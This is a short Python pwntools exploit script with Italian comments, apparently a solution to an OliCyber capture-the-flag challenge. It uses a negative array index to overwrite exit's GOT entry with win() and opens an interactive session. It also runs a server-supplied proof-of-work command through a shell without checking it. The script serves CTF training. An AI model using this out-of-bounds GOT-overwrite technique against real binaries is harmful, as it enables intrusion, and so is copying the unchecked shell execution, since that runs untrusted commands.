from pwn import *
import subprocess

# Siccome la sezione .got si trova a indirizzi superiori della sezione .bss dove si trova la struttura dragons
# si può sovrascrivere l'indirizzo di exit() che il programma guarda quando viene chiamata la funzione
# e fare in modo che diventi quello della funzione win(), attraverso l'utilizzo della funziona fight()

r = remote("dragonfightersclub.challs.olicyber.it", 38303)

r.recvuntil(b"or\n")
cmd = r.recvuntil(b"\n").strip().decode()
result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
r.sendlineafter(b"Result: ", result.encode())
print("Hashing finished!")

# exit@got.plt    =>      0x404058 - 8
# dragons         =>      0x4040a0
# Per arrivare all'indirizzo che contiene l'indirizzo di exit, posizione drago: -5

# win                   =>      0x004012c1
# exit@got.plt addr     =>      0x004010b0
# Per impostare indirizzo di exit a win, danno inflitto: &exit - &win

def fight(dragon, damage):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(dragon).encode())
    r.recv(1000)
    r.sendline(str(damage).encode())

def exit():
    r.sendlineafter(b"> ", b"5")
    r.interactive()

win_addr = 0x004012c1
exit_addr = 0x004010b0

# Raggiungo abbastanza punti per poter "combattere" con exit
for i in range(8):
    fight(i, 100)
for _ in range(80):
    fight(8, 0)

fight(-5, exit_addr-win_addr)
exit()